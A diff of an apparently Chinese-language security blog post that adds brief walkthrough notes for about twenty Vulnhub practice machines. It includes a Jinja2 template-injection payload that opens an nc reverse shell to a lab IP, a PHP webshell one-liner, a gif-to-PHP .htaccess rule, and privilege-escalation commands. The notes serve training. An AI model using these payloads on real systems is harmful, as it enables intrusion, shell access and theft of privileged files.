@@ -23,10 +23,12 @@
 <meta property="og:site_name" content="Cosmic Fragments">
 <meta property="og:description" content="‮">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2023-07-21T13:24:27.437Z">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/228585/1678958422980-b24bb5f8-03cb-4f33-81e5-e226cfbe65d2.png#averageHue=%231d2634&clientId=u249de0c7-9d8f-4&from=paste&height=711&id=u6c727c99&originHeight=782&originWidth=1725&originalType=binary&ratio=1.100000023841858&rotation=0&showTitle=false&size=923428&status=done&style=none&taskId=u16e497d3-55de-4856-b0a6-7b1e36232d4&title=&width=1568.1817841923935">
+<meta property="og:updated_time" content="2023-07-21T13:32:46.588Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="50台Vulnhub靶机Walkthrough">
 <meta name="twitter:description" content="‮">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/228585/1678958422980-b24bb5f8-03cb-4f33-81e5-e226cfbe65d2.png#averageHue=%231d2634&clientId=u249de0c7-9d8f-4&from=paste&height=711&id=u6c727c99&originHeight=782&originWidth=1725&originalType=binary&ratio=1.100000023841858&rotation=0&showTitle=false&size=923428&status=done&style=none&taskId=u16e497d3-55de-4856-b0a6-7b1e36232d4&title=&width=1568.1817841923935">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -475,7 +477,10 @@
 <li>结果这些都不能利用，是root定时运行着一个chkrootkit的提权</li>
 </ul>
 <p>假WP：没有log路径<a href="https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub-ctf-walkthrough/" target="_blank" rel="noopener">https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub-ctf-walkthrough/</a><br><br><a href="https://www.doyler.net/security-not-included/vulnhub-sunset-decoy-walkthrough" target="_blank" rel="noopener">https://www.doyler.net/security-not-included/vulnhub-sunset-decoy-walkthrough</a><br><a name="zrYuu"></a></p>
-<h3 id="djinn3"><a href="#djinn3" class="headerlink" title="djinn3"></a>djinn3</h3><ul>
+<h3 id="djinn3"><a href="#djinn3" class="headerlink" title="djinn3"></a>djinn3</h3><pre><code>- _{{7*'7'}}_显示7777777，所以是Jinja2而非Twig
+- {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.146.55 8888 >/tmp/f').read() }}
+</code></pre><p>这里我的hexo博客 双大括号标签与 nunjucks 模板引擎的标签发生了冲突，只能整个放代码块里了：<a href="http://www.jouypub.com/2019/184012d6f6847138055a342ff942b743/" target="_blank" rel="noopener">http://www.jouypub.com/2019/184012d6f6847138055a342ff942b743/</a></p>
+<ul>
 <li>pspy发现sanit运行的py，反编译pyc构造ssh私钥免登录</li>
 <li>sudo -l有adduser，sudo adduser test -gid=0加一个root组的用户</li>
 <li>root组对/etc/sudoers可读，发现一个不存在的用户可以执行apt-get，添加这个用户然后提权</li>
@@ -494,7 +499,166 @@
 <li>(root) NOPASSWD: /root/lago 可执行不可读</li>
 <li>.pyc反编译找到源码逻辑 <strong>（思路：python的题目环境下多关注pyc文件）</strong>提权</li>
 </ul>
-<p><a href="https://www.cnblogs.com/sn1per/p/11984455.html" target="_blank" rel="noopener">https://www.cnblogs.com/sn1per/p/11984455.html</a></p>
+<p><a href="https://www.cnblogs.com/sn1per/p/11984455.html" target="_blank" rel="noopener">https://www.cnblogs.com/sn1per/p/11984455.html</a><br><a name="T2EBH"></a></p>
+<h3 id="nullbyte"><a href="#nullbyte" class="headerlink" title="nullbyte"></a>nullbyte</h3><ul>
+<li>phpmyadmin是兔子洞，没口令，页面gif里信息是web目录</li>
+<li>爆破key，注入到user口令，phpmyadmin登不上，连SSH</li>
+<li>web目录下的SUID文件，linepeas扫不到</li>
+<li>echo “/bin/bash -p” &gt; ps 覆盖环境变量提权</li>
+</ul>
+<p><a href="https://markclayton.github.io/nullbyte-vulnhub-walkthrough.html" target="_blank" rel="noopener">https://markclayton.github.io/nullbyte-vulnhub-walkthrough.html</a></p>
+<p><a name="aj5cj"></a></p>
+<h3 id="Glasgow-Smile"><a href="#Glasgow-Smile" class="headerlink" title="Glasgow Smile"></a>Glasgow Smile</h3><ul>
+<li>joomla scan扫到版本没有exp利用成功</li>
+<li>joomla后台口令joomla/Gotham，用户名忘了试joomla</li>
+<li>joomla后台extention getshell</li>
+<li>web文件有密码，mysql试了root和mysql又没试joomla，查到rob密码</li>
+<li>ssh登rob看到加密留言，rot13不对，rot1解码（凯撒）切abner用户</li>
+<li>abner用户的bash_history提到一个压缩包，find找到，解压密码没爆出来，是ssh密码</li>
+<li>切到penguin，pspy发现root执行一个文件，改文件内容提权</li>
+</ul>
+<p><a href="https://www.infosecarticles.com/glasgow-smile-1-vulnhub-walkthrough/" target="_blank" rel="noopener">https://www.infosecarticles.com/glasgow-smile-1-vulnhub-walkthrough/</a><br><a href="https://www.kielvaughn.com/ctfs/2020-06-25-glasgow-smile-walkthrough/" target="_blank" rel="noopener">https://www.kielvaughn.com/ctfs/2020-06-25-glasgow-smile-walkthrough/</a></p>
+<p><a name="JONu3"></a></p>
+<h3 id="w34kn3ss"><a href="#w34kn3ss" class="headerlink" title="w34kn3ss"></a>w34kn3ss</h3><ul>
+<li>nmap -A扫描可以看到SSLcert的commonName=weakness.jth，加进hosts</li>
+<li><strong>（碰到HTTPS的站要敏锐）</strong></li>
+<li>再访问提示用户名，目录下有key.pub和提示openssl 0.9.8c-1生成</li>
+<li>searchsploit能根据公钥找到公开的配对私钥，登录SSH</li>
+<li>目录下python可执行文件，这次没有pyc，直接拖回来uncompyle6反编译，找到n30密码</li>
+<li>在sudo组，sudo -l ALL，有密码直接切</li>
+</ul>
+<p><a href="https://yufongg.github.io/posts/W34KN3SS/" target="_blank" rel="noopener">https://yufongg.github.io/posts/W34KN3SS/</a></p>
+<p><a name="vil8A"></a></p>
+<h3 id="Pyexp"><a href="#Pyexp" class="headerlink" title="Pyexp"></a>Pyexp</h3><ul>
+<li>python exec() 命令执行</li>
+<li><code>import pty; pty.spawn(&quot;/bin/bash&quot;)</code></li>
+</ul>
+<p><a href="https://www.infosecarticles.com/pyexp-vulnhub-walkthrough/" target="_blank" rel="noopener">https://www.infosecarticles.com/pyexp-vulnhub-walkthrough/</a></p>
+<p><a name="KU5Ad"></a></p>
+<h3 id="Seppuku"><a href="#Seppuku" class="headerlink" title="Seppuku"></a>Seppuku</h3><ul>
+<li>web目录里找到用户名和密码字典，爆破ssh</li>
+<li>ssh  -t ‘bash –noprofile’ 绕过rbash</li>
+<li>sudo -l发现用户A可以以root执行用户B目录下的文件，分别用密码和密钥登录两个用户构造利用</li>
+</ul>
+<p><a name="GM0jZ"></a></p>
+<h3 id="DriftingBlues6"><a href="#DriftingBlues6" class="headerlink" title="DriftingBlues6"></a>DriftingBlues6</h3><ul>
+<li>robots.txt里找到后台路径和.zip后缀提示，扫到压缩包爆破</li>
+<li>textpattern后台文件上传getshell</li>
+<li>内核版本3.2.0-4 脏牛40839提权（是建立firefart用户）</li>
+</ul>
+<p><a name="iaWiC"></a></p>
+<h3 id="TommyBoy"><a href="#TommyBoy" class="headerlink" title="TommyBoy"></a>TommyBoy</h3><ul>
+<li>非常多的信息收集，修改UA，使用Crunch生成自定义格式的密码字典</li>
+</ul>
+<p><a name="YHOGu"></a></p>
+<h3 id="Moria"><a href="#Moria" class="headerlink" title="Moria"></a>Moria</h3><ul>
+<li>web目录下随机返回文本，猜测在读一个txt，扫到txt根据提示抓包看knock</li>
+<li>web自动对几个低端口在做knock，将端口号转ASCII码得到密码，脑洞</li>
+<li>根据文本提示用用户名和密码登FTP，没有下载权限但可以看到一个web目录</li>
+<li>访问看到一组用户名密码，源码里有加密方式和盐，john解密(dynamic_6, refer to: <a href="https://github.com/piyushcse29/john-the-ripper/blob/master/doc/DYNAMIC" target="_blank" rel="noopener">https://github.com/piyushcse29/john-the-ripper/blob/master/doc/DYNAMIC</a>)，尝试登ssh</li>
+<li>存在./ssh/id_rsa，尝试ssh <a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a>成功（这个linpeas也只能标红，看不出是哪个用户的key）</li>
+</ul>
+<p><a href="https://blog.csdn.net/qq_34801745/article/details/104163657" target="_blank" rel="noopener">https://blog.csdn.net/qq_34801745/article/details/104163657</a></p>
+<p><a name="GN0lB"></a></p>
+<h3 id="IMF"><a href="#IMF" class="headerlink" title="IMF"></a>IMF</h3><ul>
+<li>页面源码提示，拼接路径，根据页面信息的用户名，php弱类型绕过登录，报错注入</li>
+<li>GIF89A图片马文件上传，限制了函数使用，可以&lt;?php $c=$_GET[‘c’]; echo <code>$c</code>; ?&gt;或者weevely</li>
+<li>注意木马后缀和Content-Type，这里实际有一个.htaccess将gif解析到了php，但是浏览器访问403看不到</li>
+<li>AddType application/x-httpd-php .php .gif AddHandler application/x-httpd-php .gif</li>
+</ul>
+<p><a href="https://g0blin.co.uk/imf-vulnhub-writeup/" target="_blank" rel="noopener">https://g0blin.co.uk/imf-vulnhub-writeup/</a><br><a href="https://blog.csdn.net/shenyu_1126/article/details/110188872" target="_blank" rel="noopener">https://blog.csdn.net/shenyu_1126/article/details/110188872</a></p>
+<p><a name="s21WK"></a></p>
+<h3 id="Kioptrix1"><a href="#Kioptrix1" class="headerlink" title="Kioptrix1"></a>Kioptrix1</h3><ul>
+<li>139端口Samba 2.2.1a有9924.rb或者10.c可以直接打到root，但是nmap扫不出这个版本，需要用msf的smb_version或者wireshark抓包或者其他工具扫出这个版本</li>
+<li>或者nmap扫到443端口有mod_ssl 2.8.4这个模块，47080.c打到apache权限后再3.c内核提权（kernel 2.4 RedHat）</li>
+</ul>
+<p><a name="snEcM"></a></p>
+<h3 id="Kioptrix2"><a href="#Kioptrix2" class="headerlink" title="Kioptrix2"></a>Kioptrix2</h3><ul>
+<li>登录框万能密码，ping命令注入弹shell</li>
+<li>kernel 2.6.9提权但是只有9545.c可用，这里要注意searchspolit只能搜2.6，写到小版本就搜不到</li>
+</ul>
+<p><a name="EttVA"></a></p>
+<h3 id="Kioptrix3"><a href="#Kioptrix3" class="headerlink" title="Kioptrix3"></a>Kioptrix3</h3><ul>
+<li>lotuscms RCE，拿web权限找数据库密码（<strong>linpeas没发现，手工翻</strong>）登phpmyadmin</li>
+<li>找到更多口令，登不同ssh账户找信息（<strong>广度优先</strong>），找到一个SUID编辑器，改文件提权</li>
+</ul>
+<p><a href="https://www.cnblogs.com/starrys/p/14660428.html" target="_blank" rel="noopener">https://www.cnblogs.com/starrys/p/14660428.html</a><br><a name="dWswz"></a></p>
+<h3 id="HackinOS"><a href="#HackinOS" class="headerlink" title="HackinOS"></a>HackinOS</h3><ul>
+<li>wordpress但是upload.php文件上传，源码（<strong>记得下拉</strong>）有hint看到检测MIME和webshell随机重命名规则</li>
+<li>弹shell后看到ip172和其他环境说明在docker，wp-config看到mysql凭据，连进去找到信息</li>
+<li>docker里没ssh，从外面再ssh进宿主机，然后docker提权或者SUID文件环境变量提权</li>
+</ul>
+<p><a href="https://blog.csdn.net/valecalida/article/details/121366341" target="_blank" rel="noopener">https://blog.csdn.net/valecalida/article/details/121366341</a></p>
+<p><a name="I0n8f"></a></p>
+<h3 id="Vulnerable-docker"><a href="#Vulnerable-docker" class="headerlink" title="Vulnerable docker"></a>Vulnerable docker</h3><ul>
+<li>wordpress密码爆破后台getshell，地址是172在docker里，在内网扫C段端口<strong>（还缺个好工具）（不知道fscan只做扫描让不让用）</strong></li>
+<li><strong>（把扫描器丢内网扫，而不是把流量代理进去扫，因为很不稳定）</strong></li>
+<li>搭建frp反代出来，访问扫描到的8022端口，发现是web模拟的docker shell，弹shell到kali</li>
+<li>-sT：使用TCP扫描，因为我frp配的是tcp协议</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/228585/1678958422980-b24bb5f8-03cb-4f33-81e5-e226cfbe65d2.png#averageHue=%231d2634&amp;clientId=u249de0c7-9d8f-4&amp;from=paste&amp;height=711&amp;id=u6c727c99&amp;originHeight=782&amp;originWidth=1725&amp;originalType=binary&amp;ratio=1.100000023841858&amp;rotation=0&amp;showTitle=false&amp;size=923428&amp;status=done&amp;style=none&amp;taskId=u16e497d3-55de-4856-b0a6-7b1e36232d4&amp;title=&amp;width=1568.1817841923935" alt="image.png"></p>
+<ul>
+<li>/.dockerenv存在说明还是一个docker容器，</li>
+<li>/var/run/docker.sock存在说明可以使用docker remote API未授权访问漏洞</li>
+<li>或./docker run -it -v /:/host ubuntu bash挂载宿主机目录 <a href="https://xz.aliyun.com/t/8558#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/8558#toc-4</a></li>
+</ul>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2MDI0NTM2Nw==&amp;mid=2247487509&amp;idx=1&amp;sn=563b65936055600a5dae78bb14430c48" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2MDI0NTM2Nw==&amp;mid=2247487509&amp;idx=1&amp;sn=563b65936055600a5dae78bb14430c48</a><br><a href="https://arz101.medium.com/vulnhub-vulnerable-docker-easy-9b5d0d567531" target="_blank" rel="noopener">https://arz101.medium.com/vulnhub-vulnerable-docker-easy-9b5d0d567531</a></p>
+<p><a name="BXrmV"></a></p>
+<h3 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h3><ul>
+<li>登录框注入得到一批口令，登录后看到File not exist提示，fuzz尝试LFI</li>
+<li>从../../../../../proc/sched_debug看到有knockd<strong>（本来扫端口没看到22就要警觉knock）</strong></li>
+<li>读配置文件/etc/knockd.conf看端口顺序</li>
+<li><code>for x in 7469 8475 9842;do nmap ‐Pn ‐‐max‐retries 0 ‐p $x 192.168.56.112;done</code>  </li>
+<li>或<code>for x in 7469 8475 9842 22 ;do nc 192.168.56.112 $x;done</code>   两种方便的knock方法</li>
+<li>组合前面口令爆破ssh，登上去找信息再组合再爆，新的用户sudo -l有一个文件可以利用</li>
+<li>从上级目录（这里不用反编译）找到源码，是追加写文件的功能，那么可以写/etc/passwd</li>
+<li>或/etc/sudoers        joeyt ALL=(ALL) ALL</li>
+</ul>
+<p><a href="https://zhuanlan.zhihu.com/p/348045207" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/348045207</a></p>
+<p><a name="Azvo5"></a></p>
+<h3 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h3><ul>
+<li>wordpress文章提示cewl，根据爬取网页生成字典（-v 可verbose），爆破用户口令</li>
+<li>两个用户登后台都没有admin权限没法shell，再登SSH</li>
+<li>这里的rbash用ssh bash或者-t ‘bash –noprofile’都没用了，echo $PATH看到有限的可执行命令</li>
+<li><code>BASH_CMDS[a]=/bin/sh;a</code> # /bin/sh赋值给a,执行a</li>
+<li><code>export PATH=$PATH:/bin/:/usr/bin</code> # 导入环境变量 </li>
+</ul>
+<p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">Linux Restricted Shell绕过技巧总结 - FreeBuf网络安全行业门户</a></p>
+<ul>
+<li>提示su，切换用户 sudo -l git提权</li>
+</ul>
+<p><a name="r23O6"></a></p>
+<h3 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h3><ul>
+<li>Wordpress文章内容提示plugin，但是wpscan -vp/ap/p都扫不到</li>
+<li>根据靶机提示的密码规则爆Wordpress用户口令，进后台没有额外提示信息，只多个Activity monitor插件</li>
+<li>searchsploit打插件漏洞拿到web权限，wp-config.php里密码没用到，可以读用户目录，找到用户1密码</li>
+<li>sudo -l可以用用户2执行backup.sh文件，又可编辑文件，弹用户2shell，sudo -l (root) nmap提权</li>
+</ul>
+<p><a name="jivwA"></a></p>
+<h3 id="lin-security"><a href="#lin-security" class="headerlink" title="lin.security"></a>lin.security</h3><ul>
+<li>Linux提权专项练习，获取不到IP看<a href="https://segmentfault.com/a/1190000039013575?sort=votes" target="_blank" rel="noopener">https://segmentfault.com/a/1190000039013575?sort=votes</a>，bob/secret登录SSH作为入口点</li>
+<li>sudo -l一堆bin文件可以用，SUID文件可以用，</li>
+<li><strong>/etc/passwd里有哈希要熟练：直接替换或者john –wordlist=rockyou，不要硬爆</strong></li>
+</ul>
+<p><a name="QT3z5"></a></p>
+<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><ul>
+<li>Monitor web系统一眼直接getshell，用户目录下提示crypt.php</li>
+<li>这里走偏了去web里找加密了，当前目录下有个不可读文件夹，就没觉得异常</li>
+<li>应该直接读/crypt.php，文件夹不可读但是里面的文件可读</li>
+<li>找到密码登用户，sudo -l hping3可以利用，大家都写的读root私钥，但其实可以直接读flag</li>
+<li>第一个终端 sudo hping3 –icmp 127.0.0.1 -d 100 –sign signature –file /root/proof.txt</li>
+<li>第二个终端 sudo hping3 –icmp 127.0.0.1 –listen signature –safe</li>
+</ul>
+<p><a name="fnQwu"></a></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
+<li>Spydersec : 杂项， js解码转ASCII，cookie里目录，视频里隐藏TrueCrypt文件</li>
+<li>Gaara : base58解码，ssh爆破，gdb SUID提权</li>
+<li>BSides-Vancouver : wordpress口令爆破后台getshell计划任务提权</li>
+<li>OSCP：/secret.txt解码获得私钥登SSH，SUID提权或覆盖环境变量或写服务调用文件或lxd提权</li>
+<li>SoSimple: wordpress插件RCE，用户目录.ssh密钥登录</li>
+<li>funbox7: -x .php扩大信息搜集范围，webshell后SSH爆用户口令</li>
+<li>EVM: 开了一堆端口，结果就是WP rockyou爆破getshell隐藏文件含有root密码，网页还是坏的</li>
+</ul>
 
       
     </div>
@@ -527,7 +691,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sar2html"><span class="toc-number">1.</span> <span class="toc-text">sar2html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LiterallyVulnerable"><span class="toc-number">2.</span> <span class="toc-text">LiterallyVulnerable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misdirection"><span class="toc-number">3.</span> <span class="toc-text">Misdirection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prime1"><span class="toc-number">4.</span> <span class="toc-text">prime1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#election"><span class="toc-number">5.</span> <span class="toc-text">election</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glasgow-Smile-2"><span class="toc-number">6.</span> <span class="toc-text">Glasgow Smile 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#healthcare"><span class="toc-number">7.</span> <span class="toc-text">healthcare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secarmy-village"><span class="toc-number">8.</span> <span class="toc-text">secarmy_village</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DevGuru1"><span class="toc-number">9.</span> <span class="toc-text">DevGuru1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tiki"><span class="toc-number">10.</span> <span class="toc-text">Tiki</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webdeveloper"><span class="toc-number">11.</span> <span class="toc-text">webdeveloper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solidstate"><span class="toc-number">12.</span> <span class="toc-text">solidstate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tr0ll02"><span class="toc-number">13.</span> <span class="toc-text">Tr0ll02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Escalate-Linux"><span class="toc-number">14.</span> <span class="toc-text">Escalate_Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pinky’s-palace-02"><span class="toc-number">15.</span> <span class="toc-text">Pinky’s palace 02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zico2"><span class="toc-number">16.</span> <span class="toc-text">zico2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hackme"><span class="toc-number">17.</span> <span class="toc-text">hackme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadOfTheRoot"><span class="toc-number">18.</span> <span class="toc-text">LoadOfTheRoot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decoy"><span class="toc-number">19.</span> <span class="toc-text">decoy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#djinn3"><span class="toc-number">20.</span> <span class="toc-text">djinn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#djinn1"><span class="toc-number">21.</span> <span class="toc-text">djinn1</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sar2html"><span class="toc-number">1.</span> <span class="toc-text">sar2html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LiterallyVulnerable"><span class="toc-number">2.</span> <span class="toc-text">LiterallyVulnerable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misdirection"><span class="toc-number">3.</span> <span class="toc-text">Misdirection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prime1"><span class="toc-number">4.</span> <span class="toc-text">prime1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#election"><span class="toc-number">5.</span> <span class="toc-text">election</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glasgow-Smile-2"><span class="toc-number">6.</span> <span class="toc-text">Glasgow Smile 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#healthcare"><span class="toc-number">7.</span> <span class="toc-text">healthcare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secarmy-village"><span class="toc-number">8.</span> <span class="toc-text">secarmy_village</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DevGuru1"><span class="toc-number">9.</span> <span class="toc-text">DevGuru1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tiki"><span class="toc-number">10.</span> <span class="toc-text">Tiki</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webdeveloper"><span class="toc-number">11.</span> <span class="toc-text">webdeveloper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solidstate"><span class="toc-number">12.</span> <span class="toc-text">solidstate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tr0ll02"><span class="toc-number">13.</span> <span class="toc-text">Tr0ll02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Escalate-Linux"><span class="toc-number">14.</span> <span class="toc-text">Escalate_Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pinky’s-palace-02"><span class="toc-number">15.</span> <span class="toc-text">Pinky’s palace 02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zico2"><span class="toc-number">16.</span> <span class="toc-text">zico2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hackme"><span class="toc-number">17.</span> <span class="toc-text">hackme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadOfTheRoot"><span class="toc-number">18.</span> <span class="toc-text">LoadOfTheRoot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decoy"><span class="toc-number">19.</span> <span class="toc-text">decoy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#djinn3"><span class="toc-number">20.</span> <span class="toc-text">djinn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#djinn1"><span class="toc-number">21.</span> <span class="toc-text">djinn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nullbyte"><span class="toc-number">22.</span> <span class="toc-text">nullbyte</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glasgow-Smile"><span class="toc-number">23.</span> <span class="toc-text">Glasgow Smile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#w34kn3ss"><span class="toc-number">24.</span> <span class="toc-text">w34kn3ss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pyexp"><span class="toc-number">25.</span> <span class="toc-text">Pyexp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Seppuku"><span class="toc-number">26.</span> <span class="toc-text">Seppuku</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DriftingBlues6"><span class="toc-number">27.</span> <span class="toc-text">DriftingBlues6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TommyBoy"><span class="toc-number">28.</span> <span class="toc-text">TommyBoy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Moria"><span class="toc-number">29.</span> <span class="toc-text">Moria</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IMF"><span class="toc-number">30.</span> <span class="toc-text">IMF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kioptrix1"><span class="toc-number">31.</span> <span class="toc-text">Kioptrix1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kioptrix2"><span class="toc-number">32.</span> <span class="toc-text">Kioptrix2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kioptrix3"><span class="toc-number">33.</span> <span class="toc-text">Kioptrix3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HackinOS"><span class="toc-number">34.</span> <span class="toc-text">HackinOS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerable-docker"><span class="toc-number">35.</span> <span class="toc-text">Vulnerable docker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC9"><span class="toc-number">36.</span> <span class="toc-text">DC9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC2"><span class="toc-number">37.</span> <span class="toc-text">DC2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC6"><span class="toc-number">38.</span> <span class="toc-text">DC6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lin-security"><span class="toc-number">39.</span> <span class="toc-text">lin.security</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP"><span class="toc-number">40.</span> <span class="toc-text">ICMP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-number">41.</span> <span class="toc-text">其他</span></a></li></ol>
         
     </div>
     <style>
